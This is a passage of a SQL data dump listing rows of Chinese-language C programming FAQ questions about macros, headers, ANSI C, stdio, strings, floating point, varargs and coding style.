150713100445',2,'',0,1,'既然在C语言中所有的非零值都被看作“真”，那是不是把TRUE定义为1很危险？如果某个内建的函数或关系操作符“返回”不是1的其他值怎么办？',19,NULL,0,NULL,0),(265,0,'20150713100445',2,'',0,1,'当p是指针时，if(p)是合法的条件表达式吗？',17,NULL,0,NULL,0),(266,0,'20150713100446',2,'',0,0,'我该使用像TRUE和FALSE这样的符号名称还是直接用来作布尔常量？',49,NULL,0,NULL,0),(267,0,'20150713100446',2,'',0,0,'我准备使用的一个第三方头文件定义了自己的TRUE和FALSE，它们跟我已经开发的部分不兼容。我该怎么办？',52,NULL,0,NULL,0),(268,0,'20150713100446',2,'',0,0,'我想定义一些函数式的宏，例如：#definesquare(x)x*x但它们并不总是正确的。为什么？',31,NULL,0,NULL,0),(269,0,'20150713100507',2,'',0,0,'怎么写一个交换两个值的通用宏？',41,NULL,0,NULL,0),(270,0,'20150713100507',2,'',0,0,'书写多语句宏的最好方法是什么？',38,NULL,0,NULL,0),(271,0,'20150713100508',2,'',0,0,'用typdef和预处理宏生成用户定义类型有什么区别？',43,NULL,0,NULL,0),(272,0,'20150713100508',2,'',0,0,'我第一次把一个程序分成多个源文件，我不知道该把什么放到.c文件，把什么放到.h文件。(“.h”到底是什么意思？)',46,NULL,0,NULL,0),(273,0,'20150713100508',2,'',0,0,'可以在一个头文件中包含另一头文件吗？',33,NULL,0,NULL,0),(274,0,'20150713100508',2,'',0,0,'完整的头文件搜索规则是怎样的？',41,NULL,0,NULL,0),(275,0,'20150713100508',2,'',0,0,'我在文件的第一个声明就遇到奇怪的语法错误，但是看上去没什么问题。',32,NULL,0,NULL,0),(276,0,'20150713100509',2,'',0,0,'我使用了来自两个不同的第三方库的头文件，它们都定义了相同的宏，如TRUE、FALSE、Min()和Max()等，但是它们的定义相互冲突，而且跟我在自己的头文件中的定义也有冲突。我该怎么办？',53,NULL,0,NULL,0),(277,0,'20150713100509',2,'',0,0,'我在编译一个程序，看起来我好像缺少需要的一个或多个头文件。谁能发给我一份？',47,NULL,0,NULL,0),(278,0,'20150713100509',2,'',0,0,'怎样构造比较字符串的#if预处理表达式？',49,NULL,0,NULL,0),(279,0,'20150713100509',2,'',0,0,'sizeof操作符可以用在#if预处理指令中吗？',38,NULL,0,NULL,0),(280,0,'20150713100509',2,'',0,0,'我可以像这样在#define行里使用#ifdef来定义两个不同的东西吗？',41,NULL,0,NULL,0),(281,0,'20150713100509',2,'',0,0,'对typedef的类型定义有没有类似#ifdef的东西？',71,NULL,0,NULL,0),(282,0,'20150713100510',2,'',0,0,'我如何用#if表达式来判断机器是高字节在前还是低字节在前？',62,NULL,0,NULL,0),(283,0,'20150713100510',2,'',0,0,'为什么在我用#ifdef关掉的代码行中报出了奇怪的语法错误？',41,NULL,0,NULL,0),(284,0,'20150713100510',2,'',0,0,'我拿到了一些代码，里边有太多的#ifdef。我不想使用预处理器把所有的#include和#ifdef都扩展开，有什么办法只保留一种条件的代码呢？',48,NULL,0,NULL,0),(285,0,'20150713100510',2,'',0,0,'如何列出所有的预定义宏？',41,NULL,0,NULL,0),(286,0,'20150713100510',2,'',0,0,'我有些旧代码，试图用这样的宏来构造标识符：#definePaste(a,b)a/**/b但是不行了。为什么？',33,NULL,0,NULL,0),(287,0,'20150713100511',2,'',0,0,'我有一个旧宏：#defineCTRL(c)(\'c\'&)不能用了。为什么？',29,NULL,0,NULL,0),(288,0,'20150713100532',2,'',0,0,'如何在宏扩展的字符串字面量中使用宏参数？',40,NULL,0,NULL,0),(289,0,'20150713100532',2,'',0,0,'我想用ANSI的“字符串化”预处理操作符#将符号常量的值放入消息中，但它总是对宏名称而不是它的值进行字符串化。这是什么原因？',57,NULL,0,NULL,0),(290,0,'20150713100532',2,'',0,0,'我想用预处理器做某件事情，但却不知道如何下手。',66,NULL,0,NULL,0),(291,0,'20150713100532',2,'',0,0,'怎样写可变参数宏？如何用预处理器“关掉”具有可变参数的函数调用？',56,NULL,0,NULL,0),(292,0,'20150713100533',2,'',0,0,'如何在通用的调试宏中包含__FILE__和__LINE__宏？',70,NULL,0,NULL,0),(293,0,'20150713100533',2,'',0,0,'什么是“ANSIC标准”？',45,NULL,0,NULL,0),(294,0,'20150713100533',2,'',0,0,'如何得到一份标准的副本？',40,NULL,0,NULL,0),(295,0,'20150713100533',2,'',0,0,'我在哪里可以找到标准的更新？',38,NULL,0,NULL,0),(296,0,'20150713100533',2,'',0,0,'为什么我的ANSI编译器对用float声明的参数会警告类型不匹配？',43,NULL,0,NULL,0),(297,0,'20150713100533',2,'',0,0,'能否混用旧式的和新型的函数语法？',34,NULL,0,NULL,0),(298,0,'20150713100534',2,'',0,0,'为什么下述声明报出了一个奇怪的警告信息“StructXdeclaredinsideparameterlist”？externintf(structx*p);',63,NULL,0,NULL,0),(299,0,'20150713100534',2,'',0,0,'有个问题一直困扰着我，它是由这一行printf(\"%d\",n);导致的，因为n是个longint型。难道ANSI的函数原型不能检查这种函数的参数不匹配问题吗？',36,NULL,0,NULL,0),(300,0,'20150713100534',2,'',0,0,'我听说必须在调用printf之前包含stdio.h。为什么？',38,NULL,0,NULL,0),(301,0,'20150713100534',2,'',0,0,'为什么不能在初始化和数组维度中使用const值？例如constintn=5;inta[n];',43,NULL,0,NULL,0),(302,0,'20150713100534',2,'',0,0,'“constchar*p”、“charconst*p”和“char*constp”有何区别？',45,NULL,0,NULL,0),(303,0,'20150713100535',2,'',0,0,'为什么不能向接受constchar**的函数传入char**？',42,NULL,0,NULL,0),(304,0,'20150713100535',2,'',0,0,'我这样声明：typedefchar*charp;constcharpp;为什么是p而不是它所指向的字符为const？',41,NULL,0,NULL,0),(305,0,'20150713100535',2,'',0,0,'能否通过将main声明为void来关掉“main没有返回值”的警告？',38,NULL,0,NULL,0),(306,0,'20150713100535',2,'',0,0,'main()的第3个参数envp是怎么回事？',48,NULL,0,NULL,0),(307,0,'20150713100536',2,'',0,1,'我觉得把main()声明为void也不会失败，因为我调用了exit()而不是return，况且我的操作系统也忽略了程序的退出/返回状态。',13,NULL,0,NULL,0),(308,0,'20150713100536',2,'',0,0,'那么到底会出什么问题？真的有什么系统不支持voidmain()吗？',44,NULL,0,NULL,0),(309,0,'20150713100536',2,'',0,0,'为什么以前流行的那些C语言书总是使用voidmain()？',38,NULL,0,NULL,0),(310,0,'20150713100536',2,'',0,0,'在main()中调用exit(status)和返回同样的status真的等价吗？',44,NULL,0,NULL,0),(311,0,'20150713100536',2,'',0,0,'我试图用ANSI“字符串化”预处理操作符\'#\'向信息中插入符号常量的值，但它字符串化的总是宏的名字而不是它的值。为什么？',45,NULL,0,NULL,0),(312,0,'20150713100536',2,'',0,0,'警告信息“warning:macroreplacementwithinastringliteral”是什么意思？',55,NULL,0,NULL,0),(313,0,'20150713100537',2,'',0,1,'为什么在我用#ifdef去掉的代码里出现了奇怪的语法错误？',16,NULL,0,NULL,0),(314,0,'20150713100537',2,'',0,1,'#pragma是什么，有什么用？',15,NULL,0,NULL,0),(315,0,'20150713100537',2,'',0,1,'“#pragmaonce”什么意思？我在一些头文件中看到了它。',14,NULL,0,NULL,0),(316,0,'20150713100537',2,'',0,1,'chara[3]=\"abc\";合法吗？它是什么意思？',16,NULL,0,NULL,0),(317,0,'20150713100537',2,'',0,1,'既然对数组的引用会退化为指针，那么，如果array是数组，array和&array之间有什么区别呢？',20,NULL,0,NULL,0),(318,0,'20150713100538',2,'',0,1,'为什么我不能对void*指针进行算术运算？',9,NULL,0,NULL,0),(319,0,'20150713100538',2,'',0,1,'memcpy()和memmove()有什么区别？',18,NULL,0,NULL,0),(320,0,'20150713100538',2,'',0,1,'malloc(0)有什么用？返回一个空指针还是指向0字节的指针？',14,NULL,0,NULL,0),(321,0,'20150713100538',2,'',0,1,'为什么ANSI标准规定了外部标识符的长度和大小写限制？',15,NULL,0,NULL,0),(322,0,'20150713100539',2,'',0,1,'noalias是怎么回事？在它身上发生了什么？',21,NULL,0,NULL,0),(323,0,'20150713100539',2,'',0,1,'为什么我的编译器对最简单的测试程序都报出了一大堆的语法错误？对这段代码的第一行就报错了：main(intargc.char**argv){return0;}',18,NULL,0,NULL,0),(324,0,'20150713100539',2,'',0,1,'为什么有些ASNI/ISO标准库函数未定义？我明明使用的就是ANSI编译器。',19,NULL,0,NULL,0),(325,0,'20150713100539',2,'',0,1,'谁有可以在旧的C程序和ANSIC之间相互转换的工具，或者自动生成原型的工具？',21,NULL,0,NULL,0),(326,0,'20150713100539',2,'',0,1,'为什么声称兼容ANSI的编译器不能编译这些代码？我知道这些代码是ANSI的，因为gcc可以编译。',18,NULL,0,NULL,0),(327,0,'20150713100539',2,'',0,1,'人们好像有些在意实现定义的(implementation-defined)、不确定的(unspecified)和未定义的(undefined)行为的区别。它们的区别到底在哪里？',19,NULL,0,NULL,0),(328,0,'20150713100540',2,'',0,1,'一个程序“合法(legal)”、“有效(valid)”或“符合标准的”(conforming)到底是什么意思？',27,NULL,0,NULL,0),(329,0,'20150713100540',2,'',0,1,'我很吃惊，ANSI标准竟然有那么多未定义的东西。标准的唯一任务不就是让这些东西标准化吗？',23,NULL,0,NULL,0),(330,0,'20150713100540',2,'',0,1,'有人说i=i++的行为是未定义的，但是我刚在一个兼容ANSI的编译器上测试，得到了我希望的结果。它真的是未定义的吗？',16,NULL,0,NULL,0),(331,0,'20150713100540',2,'',0,1,'这样的代码有什么问题？charc;while((c=getchar())!=EOF)',15,NULL,0,NULL,0),(332,0,'20150713100540',2,'',0,1,'我有个读取直到EOF的简单程序，但是我如何才能在键盘上输入那个“\\EOF”呢？我看stdio.h中定义的EOF是-1，是不是说我该输入-1？',23,NULL,0,NULL,0),(333,0,'20150713100541',2,'',0,1,'为什么这些代码把最后一行复制了两遍？while(!feof(infp)){fgets(buf,MAXLINE,infp);fputs(buf,outfp);}',14,NULL,0,NULL,0),(334,0,'20150713100541',2,'',0,1,'我用fgets将文件的每行内容读入指针数组。为什么结果所有的行都是最后一行的内容呢？',17,NULL,0,NULL,0),(335,0,'20150713100541',2,'',0,1,'我的程序的屏幕提示和中间输出有时没有在屏幕上显示，尤其是当我用管道通过另一个程序输出的时候。为什么？',17,NULL,0,NULL,0),(336,0,'20150713100541',2,'',0,1,'我怎样才能不等待回车键而一次输入一个字符？',13,NULL,0,NULL,0),(337,0,'20150713100541',2,'',0,1,'如何在printf的格式串中输出一个\'%\'字符？我试过\\%，但是不行。',27,NULL,0,NULL,0),(338,0,'20150713100541',2,'',0,1,'为什么这么写不对？longintn=;printf(\"%d\\n\",n);',21,NULL,0,NULL,0),(339,0,'20150713100542',2,'',0,1,'有人告诉我不能在printf中使用%lf。为什么printf()用%f输出double型，而scanf却用%lf呢？',17,NULL,0,NULL,0),(340,0,'20150713100542',2,'',0,1,'对于size_t那样的类型定义，当我不知道它到底是long还是其他类型的时候，我应该使用什么样的printf格式呢？',25,NULL,0,NULL,0),(341,0,'20150713100542',2,'',0,1,'如何用printf实现可变的域宽度？就是说，我想在运行时确定宽度而不是使用%8d？',15,NULL,0,NULL,0),(342,0,'20150713100542',2,'',0,1,'如何输出在千位上用逗号隔开的数字？货币格式的数字呢？',27,NULL,0,NULL,0),(343,0,'20150713100543',2,'',0,1,'为什么scanf(\"%d\",i)调用不行？',17,NULL,0,NULL,0),(344,0,'20150713100543',2,'',0,1,'为什么chars[30];scamf(\"%s\",s);不用&也可以？我原以为传给scanf的每个变量都要带&。',18,NULL,0,NULL,0),(345,0,'20150713100543',2,'',0,1,'为什么这些代码不行？doubled;scanf(\"%f\",&d);',14,NULL,0,NULL,0),(346,0,'20150713100543',2,'',0,1,'为什么这段代码不行？shortints;scanf(\"%d\",&s);',14,NULL,0,NULL,0),(347,0,'20150713100543',2,'',0,1,'怎样在scanf格式串中指定可变的宽度？',24,NULL,0,NULL,0),(348,0,'20150713100543',2,'',0,1,'怎样从特定格式的数据文件中读取数据？怎样读入10个float而不用使用包含10次%f的奇怪格式？如何将一行的任意多个域读入一个数组中？',31,NULL,0,NULL,0),(349,0,'20150713100544',2,'',0,1,'我像这样用\"%d\\n\"调用scanf从键盘读取数字：intn;scanf(\"%d\\n\",&n);printf(\"youtyped%d\\n\",n);好像要多输入一行才返回。为什么？',24,NULL,0,NULL,0),(350,0,'20150713100544',2,'',0,1,'我用scanf和%d读取一个数字，然后再用gets()读取字符串，但是编译器好像跳过了gets()调用！',22,NULL,0,NULL,0),(351,0,'20150713100544',2,'',0,1,'我发现如果坚持检查返回值以确保用户输入的是我期待的数值，则scanf的使用会安全很多。但有的时候好像会陷入无限循环。为什么？',24,NULL,0,NULL,0),(352,0,'20150713100544',2,'',0,1,'为什么大家都说不要使用scanf？那我该用什么来代替呢？',14,NULL,0,NULL,0),(353,0,'20150713100544',2,'',0,1,'我怎样才知道对于任意的sprintf调用需要多大的目标缓冲区？怎样才能避免sprintf目标缓冲区溢出？',12,NULL,0,NULL,0),(354,0,'20150713100545',2,'',0,1,'sprintf的返回值是什么？是int还是char*？',14,NULL,0,NULL,0),(355,0,'20150713100545',2,'',0,1,'为什么大家都说不要使用gets？',15,NULL,0,NULL,0),(356,0,'20150713100545',2,'',0,1,'我觉得我应该在一长串的printf调用之后检查errno，以确定是否有失败的调用。为什么当我将输出重定向到文件的时候会输出奇怪的“printffailed:Notatypewriter”信息？',18,NULL,0,NULL,0),(357,0,'20150713100545',2,'',0,1,'fgetops/fsetops和ftell/fseek之间有什么区别？fgetops和fsetops到底有什么用处？',19,NULL,0,NULL,0),(358,0,'20150713100546',2,'',0,1,'如何清除用户的多余输入，以防止在下一个提示符下读入？用fflush(stdin)可以吗？',15,NULL,0,NULL,0),(359,0,'20150713100546',2,'',0,1,'我写了一个函数用来打开文件：myfopen(char*filename,FILE*fp){fp=fopen(filename,\"r\");}可我这样调用的时候：FILE*infp;myfopen(\"filename.dat\",infp);，infp指针并没有正确设置。为什么？',25,NULL,0,NULL,0),(360,0,'20150713100546',2,'',0,1,'连一个最简单的fopen调用都不成功！这个调用有什么问题？FILE*fp=fopen(filename,\'r\');',28,NULL,0,NULL,0),(361,0,'20150713100546',2,'',0,1,'为什么我不能用完整路径名打开一个文件？这个调用总是失败：fopen(\"c:\\newdir\\file.dat\",\"r\");',20,NULL,0,NULL,0),(362,0,'20150713100546',2,'',0,1,'我想用fopen模式\"r+\"打开一个文件，读出一个字符串，修改之后再写入，从而就地更新一个文件。可是这样不行。为什么？',22,NULL,0,NULL,0),(363,0,'20150713100547',2,'',0,1,'如何在文件中间插入或删除一行(一条记录)？',22,NULL,0,NULL,0),(364,0,'20150713100547',2,'',0,1,'怎样从打开的流中恢复文件名？',17,NULL,0,NULL,0),(365,0,'20150713100547',2,'',0,1,'怎样在程序里把stdin或stdout重定向到文件？',22,NULL,0,NULL,0),(366,0,'20150713100547',2,'',0,1,'一旦使用freopen之后，怎样才能恢复原来的stdout(或stdin)？',14,NULL,0,NULL,0),(367,0,'20150713100548',2,'',0,1,'如何判断标准输入或输出是否经过了重定向，即是否在命令行上使用了“”或“”？',20,NULL,0,NULL,0),(368,0,'20150713100548',2,'',0,1,'我想写个像\"more\"那样的程序。怎样才能在stdin被重定向之后再回到交互键盘？',19,NULL,0,NULL,0),(369,0,'20150713100548',2,'',0,1,'怎样同时向两个地方输出，如同时输出到屏幕和文件？',22,NULL,0,NULL,0),(370,0,'20150713100549',2,'',0,1,'我希望按字节在内存和文件之间直接读写数字，而不像fprintf和fscanf进行格式化。我该怎么办？',20,NULL,0,NULL,0),(371,0,'20150713100549',2,'',0,1,'怎样正确地读取二进制文件？有时看到a和d容易混淆，而且如果数据中包含a的话，我好像会提前遇到EOF。',19,NULL,0,NULL,0),(372,0,'20150713100549',2,'',0,1,'我在写一个二进制文件的“过滤器”，但是stdin和stdout却被作为文本流打开了。怎样才能把它们的模式改为二进制？',18,NULL,0,NULL,0),(373,0,'20150713100549',2,'',0,1,'文本和二进制输入输出有什么区别？',17,NULL,0,NULL,0),(374,0,'20150713100549',2,'',0,1,'如何在数据文件中读写结构？',28,NULL,0,NULL,0),(375,0,'20150713100550',2,'',0,1,'怎样编写符合旧的二进制数据格式的代码？',18,NULL,0,NULL,0),(376,0,'20150713100550',2,'',0,1,'怎样把数字转为字符串(与atoi相反)？有itoa函数吗？',14,NULL,0,NULL,0),(377,0,'20150713100550',2,'',0,1,'为什么strncpy不能总在目标串放上终止符\'\\0\'？',17,NULL,0,NULL,0),(378,0,'20150713100550',2,'',0,1,'C语言有类似于其他语言中的“substr”(取出子串)的例程吗？',11,NULL,0,NULL,0),(379,0,'20150713100551',2,'',0,0,'怎样把一个字符串中所有字符转换成大写或小写？',43,NULL,0,NULL,0),(380,0,'20150713100551',2,'',0,0,'为什么有些版本的toupper对大写字符会有奇怪的反应？为什么有的代码在调用toupper前先调用islower？',42,NULL,0,NULL,0),(381,0,'20150713100551',2,'',0,1,'怎样将字符串分割成用空白分隔的字段？怎样实现类似main处理argc和argv的过程？',19,NULL,0,NULL,0),(382,0,'20150713100551',2,'',0,1,'哪里可以找到处理正则表达式或通配符匹配的代码？',21,NULL,0,NULL,0),(383,0,'20150713100551',2,'',0,1,'我想用strcmp作为比较函数，调用qsort对一个字符串数组排序，但是不行。为什么？',16,NULL,0,NULL,0),(384,0,'20150713100552',2,'',0,0,'我想用qsort()对一个结构数组排序。我的比较函数接受结构指针，但是编译器认为这个函数不是qsort需要的类型。我要怎样转换这个函数指针才能避免这样的警告？',36,NULL,0,NULL,0),(385,0,'20150713100552',2,'',0,0,'怎样对一个链表排序？',44,NULL,0,NULL,0),(386,0,'20150713100552',2,'',0,0,'怎样对大于内存容量的数据排序？',54,NULL,0,NULL,0),(387,0,'20150713100552',2,'',0,0,'怎样在C程序中取得当前日期或时间？',69,NULL,0,NULL,0),(388,0,'20150713100552',2,'',0,0,'我知道库函数localtime可以把time_t转换成结构structtm，而ctime可以把time_t转换成为可打印的字符串。怎样才能进行反向操作，把structtm或一个字符串转换成time_t？',27,NULL,0,NULL,0),(389,0,'20150713100553',2,'',0,0,'怎样在日期上加n天？怎样取得两个日期的时间间隔？',67,NULL,0,NULL,0),(390,0,'20150713100614',2,'',0,0,'怎样获得某一范围内的随机整数？',43,NULL,0,NULL,0),(391,0,'20150713100614',2,'',0,0,'每次执行程序，rand都返回相同的数字序列。为什么？',28,NULL,0,NULL,0),(392,0,'20150713100614',2,'',0,0,'我需要随机的真/假值，所以我就直接用rand()%2，可是我得到交替的,,0…。为什么？　',45,NULL,0,NULL,0),(393,0,'20150713100614',2,'',0,0,'如何获取根本不重复的随机数？',54,NULL,0,NULL,0),(394,0,'20150713100615',2,'',0,0,'怎样产生正态分布或高斯分布的随机数？',39,NULL,0,NULL,0),(395,0,'20150713100615',2,'',0,0,'我在移植一个程序，里边调用了一个函数drand48　，而我的库又没有这个。这是个什么函数？',40,NULL,0,NULL,0),(396,0,'20150713100615',2,'',0,0,'exit(status)是否真的跟从main函数返回status等价？',43,NULL,0,NULL,0),(397,0,'20150713100616',2,'',0,0,'memcpy和memmove有什么区别？',60,NULL,0,NULL,0),(398,0,'20150713100616',2,'',0,0,'我想移植这个旧程序。为什么报出这些“undefinedexternal”错误：index?、rindex?、bcopy?、bcmp?、bzero?？',44,NULL,0,NULL,0),(399,0,'20150713100616',2,'',0,0,'我不断得到库函数未定义错误，但是我已经包含了所有用到的头文件了。',36,NULL,0,NULL,0),(400,0,'20150713100616',2,'',0,0,'虽然我在连接时明确地指定了正确的函数库，我还是得到库函数未定义错误。',41,NULL,0,NULL,0),(401,0,'20150713100616',2,'',0,0,'一个最简单的程序，不过在一个窗口里打印出“Hello,World”，为什么会编译出巨大的可执行代码(数百K)？我该少包含一些头文件吗？',39,NULL,0,NULL,0),(402,0,'20150713100617',2,'',0,0,'连接器报告_end未定义代表什么意思？',44,NULL,0,NULL,0),(403,0,'20150713100617',2,'',0,0,'我的编译器提示printf未定义！这怎么可能？',62,NULL,0,NULL,0),(404,0,'20150713100617',2,'',0,0,'一个float变量赋值为时，为什么printf输出的值为？',56,NULL,0,NULL,0),(405,0,'20150713100617',2,'',0,0,'我想计算一些平方根，我把程序简化成这样：main(){printf(\"%f\\h\",sqrt(.));可得到的结果却是疯狂的数字。为什么？',37,NULL,0,NULL,0),(406,0,'20150713100618',2,'',0,0,'我想做一些简单的三角函数运算，也包含了math.h，但连接器总是提示sin、cos这样的函数未定义。为什么？',67,NULL,0,NULL,0),(407,0,'20150713100618',2,'',0,0,'我的浮点数计算程序表现得很奇怪，在不同的机器上给出了不同的结果。为什么？',32,NULL,0,NULL,0),(408,0,'20150713100618',2,'',0,0,'有什么好的方法来检查浮点数在“足够接近”情况下的相等？',49,NULL,0,NULL,0),(409,0,'20150713100618',2,'',0,0,'怎样取整？',37,NULL,0,NULL,0),(410,0,'20150713100619',2,'',0,0,'为什么C语言不提供乘幂的操作符？',37,NULL,0,NULL,0),(411,0,'20150713100619',2,'',0,0,'为什么我机器上的math.h没有预定义常量M_PI？',32,NULL,0,NULL,0),(412,0,'20150713100619',2,'',0,0,'怎样将变量置为IEEENaN(“NotaNumber”)或检测变量是否为NaN及其他特殊值？',42,NULL,0,NULL,0),(413,0,'20150713100619',2,'',0,0,'如何简洁地处理浮点异常？',36,NULL,0,NULL,0),(414,0,'20150713100619',2,'',0,0,'在C语言中如何很好地实现复数？',48,NULL,0,NULL,0),(415,0,'20150713100620',2,'',0,0,'我要寻找一些实现以下功能的程序源代码：快速傅立叶变换(FFT)、矩阵算术(乘法、求逆等函数)、复数算术。',53,NULL,0,NULL,0),(416,0,'20150713100620',2,'',0,0,'TurboC的程序崩溃，显示错误为“floatingpointformatsnotlinked”(浮点格式未连接)。我还缺点儿什么呢？',49,NULL,0,NULL,0),(417,0,'20150713100620',2,'',0,0,'为什么调用printf前必须要包含stdio.h？',45,NULL,0,NULL,0),(418,0,'20150713100620',2,'',0,0,'为什么%f可以在printf参数中同时表示float和double？它们难道不是不同类型吗？',49,NULL,0,NULL,0),(419,0,'20150713100620',2,'',0,0,'我遇到了一个令人十分受挫的问题，后来发现是这行代码造成的：printf(\"%d\",n);原来n是longint型。难道ANSI的函数原型不就是用来防止这类的参数类型不匹配吗？',42,NULL,0,NULL,0),(420,0,'20150713100621',2,'',0,0,'怎样写一个接受可变参数的函数？',57,NULL,0,NULL,0),(421,0,'20150713100621',2,'',0,0,'怎样写一个函数，像printf那样接受一个格式串和可变参数，然后再把参数传给printf去完成大部分工作？',49,NULL,0,NULL,0),(422,0,'20150713100621',2,'',0,0,'怎样写类似scanf的函数，再把参数传给scanf去完成大部分工作？',47,NULL,0,NULL,0),(423,0,'20150713100621',2,'',0,0,'我用的是ANSI前的编译器，没有stdarg.h文件。我该怎么办？',46,NULL,0,NULL,0),(424,0,'20150713100621',2,'',0,0,'怎样知道实际上有多少个参数传入函数？',43,NULL,0,NULL,0),(425,0,'20150713100622',2,'',0,0,'为什么编译器不允许我定义一个没有固定参数项的可变参数函数？',47,NULL,0,NULL,0),(426,0,'20150713100622',2,'',0,0,'我有个接受float型的变参函数，为什么va_arg(argp,float)却不行？',46,NULL,0,NULL,0),(427,0,'20150713100622',2,'',0,0,'为什么va_arg不能得到类型为函数指针的参数？',41,NULL,0,NULL,0),(428,0,'20150713100622',2,'',0,0,'怎样实现一个可变参数函数，它把参数再传给另一个可变参数函数？',37,NULL,0,NULL,0),(429,0,'20150713100622',2,'',0,0,'怎样调用一个在运行时才构建参数列表的函数？',32,NULL,0,NULL,0),(430,0,'20150713100623',2,'',0,0,'为什么这个循环只执行了一次？for(i=start;iend;i++);{printf(\"%d\\n\",i);}',45,NULL,0,NULL,0),(431,0,'20150713100623',2,'',0,0,'遇到不可理解的不合理语法错误，似乎大段的程序没有编译。',48,NULL,0,NULL,0),(432,0,'20150713100623',2,'',0,0,'为什么过程调用不起作用？编译器似乎直接跳过去了。',66,NULL,0,NULL,0),(433,0,'20150713100623',2,'',0,0,'程序在执行之前就崩溃了！(用调试器单步跟踪，在main函数的第一个语句之前就死了。)为什么？　　程序执行正确，但退出时在main函数的最后一个语句之后崩溃了。为什么会这样？',34,NULL,0,NULL,0),(434,0,'20150713100645',2,'',0,0,'程序在一台机器上运行完美，但在另一台上却得到怪异的结果。更奇怪的是，增加或去除调试的打印语句，就改变了症状……',42,NULL,0,NULL,0),(435,0,'20150713100645',2,'',0,0,'为什么下面的代码会崩溃？char*p=\"hello,world!\";p[0]=\'H\';',40,NULL,0,NULL,0),(436,0,'20150713100645',2,'',0,0,'我有些代码是用来解析外部结构的，但它却崩溃了，报了“unalignedaccess”(未对齐的访问)错误。这是什么意思？',49,NULL,0,NULL,0),(437,0,'20150713100645',2,'',0,0,'“Segmentationviolation”、“Buserror”和“Generalprotectionfault”是什么意思？',56,NULL,0,NULL,0),(438,0,'20150713100645',2,'',0,0,'什么是C最好的代码布局风格？',56,NULL,0,NULL,0),(439,0,'20150713100646',2,'',0,0,'如何在源文件中合理分配函数？',39,NULL,0,NULL,0),(440,0,'20150713100646',2,'',0,0,'用if(!strcmp(s1,s2))比较两个字符串是否相等是个好风格吗？',34,NULL,0,NULL,0),(441,0,'20150713100646',2,'',0,0,'为什么有的人用if(0==x)而不是if(x==0)？',45,NULL,0,NULL,0),(442,0,'20150713100646',2,'',0,0,'为什么有些代码在每次调用printf前增加了类型转换(void)？',34,NULL,0,NULL,0),(443,0,'20150713100646',2,'',0,0,'既然NULL和0都是空指针常量，我到底该用哪一个？',61,NULL,0,NULL,0),(444,0,'20150713100647',2,'',0,0,'是该用TRUE和FALSE这样的符号名称还是直接用来作布尔常量？',50,NULL,0,NULL,0),(445,0,'20150713100647',2,'',0,0,'什么是“匈牙利表示法”(HungarianNotation)？是否值得一试？',43,NULL,0,NULL,0),(446,0,'20150713100647',2,'',0,0,'哪里可以找到“IndianHillStyleGuide”及其他编码标准？',39,NULL,0,NULL,0),(447,0,'20150713100647',2,'',0,0,'有人说goto是邪恶的，永远都不该用它。这是否太极端了？',37,NULL,0,NULL,0),(448,0,'20150713100647',2,'',0,0,'人们总是说良好的风格很重要，但当他们使用良好的风格写出清晰易读的程序后，又发现程序的效率似乎降低了。既然效率那么重要，是否可以为了效率牺牲一些风格和可读性呢？',58,NULL,0,NULL,0),(449,0,'20150713100648',2,'',0,0,'能否列一个常用工具列表？',54,NULL,0,NULL,0),(450,0,'20150713100648',2,'',0,0,'怎样捕获棘手的malloc问题？',44,NULL,0,NULL,0),(451,0,'20150713100648',2,'',0,0,'有什么免费或便宜的编译器可以使用？',47,NULL,0,NULL,0),(452,0,'20150713100648',2,'',0,0,'刚刚输入完一个程序，但它表现得很奇怪。你能发现有什么错误的地方吗？',62,NULL,0,NULL,0),(453,0,'20150713100648',2,'',0,0,'如何关掉lint对每个malloc调用报出的“warning:possiblepointeralignmentproblem”警告消息？',43,NULL,0,NULL,0),(454,0,'20150713100649',2,'',0,0,'哪里可以找到兼容ANSI的lint？',37,NULL,0,NULL,0),(455,0,'20150713100649',2,'',0,0,'难道ANSI函数原型说明没有使lint过时吗？',36,NULL,0,NULL,0),(456,0,'20150713100649',2,'',0,0,'网上有哪些C语言的教程或其他资源？',39,NULL,0,NULL,0),(457,0,'20150713100649',2,'',0,0,'哪里可以找到好的源代码实例，以供研究和学习？',40,NULL,0,NULL,0),(458,0,'20150713100649',2,'',0,0,'有什么好的学习C语言的书？有哪些高级的书和参考？',47,NULL,0,NULL,0),(459,0,'20150713100650',2,'',0,0,'哪里能找到K&R的练习答案？',32,NULL,0,NULL,0),(460,0,'20150713100650',2,'',0,0,'哪里能找到NumericalRecipesinC、Plauger的TheStandardCLibrary或Kernighan和Pike的TheUNIXProgrammingEnviroment等书里的源码？',43,NULL,0,NULL,0),(461,0,'20150713100650',2,'',0,0,'哪里可以找到标准C函数库的源代码？',42,NULL,0,NULL,0),(462,0,'20150713100650',2,'',0,0,'是否有一个在线的C参考指南？',35,NULL,0,NULL,0),(463,0,'20150713100650',2,'',0,0,'我需要分析和评估表达式的代码。从哪里可以找到？',48,NULL,0,NULL,0),(464,0,'20150713100651',2,'',0,0,'哪里可以找到C的BNF或YACC语法？',29,NULL,0,NULL,0),(465,0,'20150713100651',2,'',0,0,'谁有C编译器的测试套件？',47,NULL,0,NULL,0),(466,0,'20150713100651',2,'',0,0,'哪里有一些有用的源代码片段和例子的收集？',65,NULL,0,NULL,0),(467,0,'20150713100651',2,'',0,0,'我需要执行多精度算术的代码。',40,NULL,0,NULL,0),(468,0,'20150713100651',2,'',0,0,'在哪里和怎样取得这些可自由发布的程序？',34,NULL,0,NULL,0),(469,0,'20150713100652',2,'',0,0,'怎样从键盘直接读入字符而不用等回车键？怎样防止字符输入时的回显？',40,NULL,0,NULL,0),(470,0,'20150713100652',2,'',0,0,'怎样知道有未读的字符(如果有，有多少)？另外，如何在没有字符的时候不阻塞读入？',47,NULL,0,NULL,0),(471,0,'20150713100652',2,'',0,0,'怎样显示一个在原地更新自己的百分比或“旋转棒”的进度指示器？',61,NULL,0,NULL,0),(472,0,'20150713100652',2,'',0,0,'怎样清屏？怎样反色输出？怎样把光标移动到指定的x,y位置？',35,NULL,0,NULL,0),(473,0,'20150713100653',2,'',0,0,'怎样读入方向键、功能键？',29,NULL,0,NULL,0),(474,0,'20150713100714',2,'',0,0,'怎样做串口(“comm”)的输入输出？',40,NULL,0,NULL,0),(475,0,'20150713100714',2,'',0,0,'怎样直接输出到打印机？',43,NULL,0,NULL,0),(476,0,'20150713100714',2,'',0,0,'怎样发送转义字符序列控制终端或其他设备？',51,NULL,0,NULL,0),(477,0,'20150713100714',2,'',0,0,'怎样做图形？',36,NULL,0,NULL,0),(478,0,'20150713100715',2,'',0,0,'怎样显示GIF和JPEG图像？',47,NULL,0,NULL,0),(479,0,'20150713100715',2,'',0,0,'怎样检